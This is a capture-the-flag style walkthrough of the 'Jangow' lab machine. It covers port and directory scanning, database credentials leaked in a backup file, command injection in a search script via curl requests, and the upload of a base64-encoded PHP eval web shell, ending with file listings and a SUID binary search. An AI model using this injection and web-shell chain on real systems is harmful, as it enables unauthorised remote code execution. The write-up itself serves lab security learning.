# Jangow box writeup


## Credentials for debugging network connectivity
```
 username = "jangow01" 
 password = "abygurl69"
```


## Ports open
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.18
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Unix

```

## Bruteforcing directories
```
python3.7 dirsearch.py -u http://192.168.50.52 -r -e php,txt -f -x 400,403,404

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 16245

Output File: /media/xubzero/STUFF/mytools/dirsearch/reports/192.168.50.52/_21-12-16_18-44-26.txt

Error Log: /media/xubzero/STUFF/mytools/dirsearch/logs/errors-21-12-16_18-44-26.log

Target: http://192.168.50.52/

[18:44:26] Starting: 
[18:44:26] 200 -  336B  - /.backup
[18:44:44] 200 -   10KB - /site/     (Added to queue)
[18:44:44] 301 -  313B  - /site  ->  http://192.168.50.52/site/
[18:44:47] Starting: site/
[18:44:55] 301 -  320B  - /site/assets  ->  http://192.168.50.52/site/assets/     (Added to queue)
[18:44:55] 200 -    1KB - /site/assets/
[18:44:57] 200 -  949B  - /site/css/     (Added to queue)
[18:44:57] 301 -  317B  - /site/css  ->  http://192.168.50.52/site/css/
[18:45:00] 200 -   10KB - /site/index.html
[18:45:00] 301 -  316B  - /site/js  ->  http://192.168.50.52/site/js/     (Added to queue)
[18:45:00] 200 -  950B  - /site/js/
[18:45:07] 200 -   10KB - /site/wordpress/     (Added to queue)
[18:45:07] Starting: site/assets/
[18:45:19] 200 -   23KB - /site/assets/favicon.ico
[18:45:20] 301 -  324B  - /site/assets/img  ->  http://192.168.50.52/site/assets/img/     (Added to queue)
[18:45:20] 200 -    2KB - /site/assets/img/
[18:45:27] Starting: site/css/
[18:45:49] Starting: site/js/
[18:46:17] Starting: site/wordpress/
[18:46:28] 200 -   87B  - /site/wordpress/config.php
[18:46:31] 200 -   10KB - /site/wordpress/index.html
[18:46:40] Starting: site/assets/img/

Task Completed



```

Backup file 
```
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```


## Payload
```
curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"hacker\"%20>%20hacker.txt"
```

### Uploading a better shell
```
<?php if(isset(\$_POST['cmd'])){print_r(@eval(\$_POST['cmd']));} ?>

After bases64 encoding
PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpe3ByaW50X3IoQGV2YWwoJF9QT1NUWydjbWQn
XSkpO30gPz4K

Request
curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpe3ByaW50X3IoQGV2YWwoJF9QT1NUWydjbWQnXSkpO30gPz4K\"|base64%20-d%20>%20hackerp.txt"



visiting hackerp.txt we can see the payload :)
Let change it to hackerp.php
curl -X GET "http://192.168.50.52/site/busque.php?buscar=echo%20\"PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpe3ByaW50X3IoQGV2YWwoJF9QT1NUWydjbWQnXSkpO30gPz4K\"|base64%20-d%20>%20hackerp.php"

Visiting the backdoor we a custom script we get 
User : www-data
System : Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
Current Folder : /var/www/html/site
Webshell : http://192.168.50.52/site/.favicon.php

www-data@192.168.50.52 > 


```

### Searching for files in the /var/www/html/ directory
```
/var/www/html
/var/www/html/.backup
/var/www/html/site
/var/www/html/site/.favicon.php
/var/www/html/site/js
/var/www/html/site/js/scripts.js
/var/www/html/site/wordpress
/var/www/html/site/wordpress/index.html
/var/www/html/site/wordpress/config.php
/var/www/html/site/index.html
/var/www/html/site/assets
/var/www/html/site/assets/favicon.ico
/var/www/html/site/assets/img
/var/www/html/site/assets/img/bg-masthead.jpg
/var/www/html/site/assets/img/demo-image-02.jpg
/var/www/html/site/assets/img/bg-signup.jpg
/var/www/html/site/assets/img/ipad.png
/var/www/html/site/assets/img/demo-image-01.jpg
/var/www/html/site/busque.php
/var/www/html/site/css
/var/www/html/site/css/styles.css
```

### Searching for files in the home folder
```
/home
/home/jangow01
/home/jangow01/user.txt
/home/jangow01/.bash_logout
/home/jangow01/.cache
/home/jangow01/.bash_history
/home/jangow01/.nano
/home/jangow01/.profile
/home/jangow01/.bashrc
/home/jangow01/.sudo_as_admin_successful
```

### Reading user.txt
```
d41d8cd98f00b204e9800998ecf8427e
```

### Finding suid binaries
find / -perm -u=s -type f 2>/dev/null
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/ubuntu-core-launcher
/usr/bin/sudo
/usr/bin/gpasswd
/bin/fusermount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/umount
/bin/ping6
/bin/mount

```

